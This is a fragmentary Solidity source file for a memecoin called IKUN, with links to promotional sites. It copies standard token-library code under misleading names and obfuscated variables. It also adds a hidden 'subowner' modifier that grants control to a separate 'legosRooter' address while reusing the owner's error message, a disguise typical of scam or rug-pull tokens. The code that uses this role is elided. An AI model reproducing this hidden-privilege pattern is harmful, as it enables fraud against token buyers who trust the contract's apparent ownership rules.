...
/*
IKUN_COIN
Did someone say meme-supremacy? $Ikun - the ultimate memecoin made by 
https://ikuncoines.me/
https://i-am-ikun.ml/
*/
...
/*
 * @dev Provides information about the current execution COIN20Burnable, including the
 ...
 */
abstract contract COIN20Burnable {
...
// File: @openzeppelin/contracts/access/COIN20Ownable.sol
 ...
 * the owner.
 */
abstract contract COIN20Ownable is COIN20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "COIN20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "COIN20Ownable: new owner is the zero address");
 ...
 * `SafeCOIN` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
...
library SafeCOIN {
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeCOIN: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeCOIN: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeCOIN: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeCOIN: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeCOIN: modulo by zero");
  }
...
contract IKUN is COIN20Burnable, COIN711, COIN20Ownable {
    
    using SafeCOIN for uint256;
    ...
    */
    ...
    /**
    * @dev See {COIN711-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "COIN20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {COIN711-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {COIN711-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {COIN711};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "COIN711: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {COIN711-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "COIN711: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "COIN711: transfer from the zero address");
        require(shippingto != address(0), "COIN711: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "COIN711: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "COIN711: approve from the zero address");
        require(transporteur != address(0), "COIN711: approve to the zero address");
